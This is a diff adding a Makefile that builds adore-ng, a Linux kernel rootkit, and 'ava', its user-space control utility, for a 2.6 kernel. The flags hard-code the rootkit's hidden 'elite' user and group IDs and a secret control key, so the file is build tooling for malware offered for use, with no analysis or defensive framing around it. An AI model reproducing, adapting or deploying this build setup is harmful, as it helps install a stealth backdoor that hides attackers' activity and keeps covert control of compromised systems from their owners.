@@ -1,0 +1,29 @@
+#
+CC=cc
+CFLAGS=-O2 -Wall
+
+CFLAGS+=-mcpu=i486
+INC=-I/mnt/linux-2.6.3/include -I.
+CFLAGS+=-DKBUILD_MODNAME=adore -DKBUILD_BASENAME=adore -fno-common
+CFLAGS+=-DELITE_UID=2618748389U -DELITE_GID=4063569279U
+CFLAGS+=-DCURRENT_ADORE=41
+CFLAGS+=-DADORE_KEY=\"fgjgggfd\"
+
+#CFLAGS+=-D__SMP__
+
+#CFLAGS+=-DMODVERSIONS
+
+all:	adore-ng ava
+
+adore-ng: adore-ng-2.6.c
+	rm -f adore-ng.o
+	$(CC) -c $(INC) $(CFLAGS) adore-ng.mod.c -o adore-ng.mod.o
+	$(CC) -c $(INC) $(CFLAGS) adore-ng-2.6.c -o adore-ng.o
+	ld -m elf_i386 -r -o adore.ko adore-ng.o adore-ng.mod.o
+
+ava: ava.c libinvisible.c
+	$(CC) $(CFLAGS) ava.c libinvisible.c -o ava
+
+clean:
+	rm -f core ava *.o
+
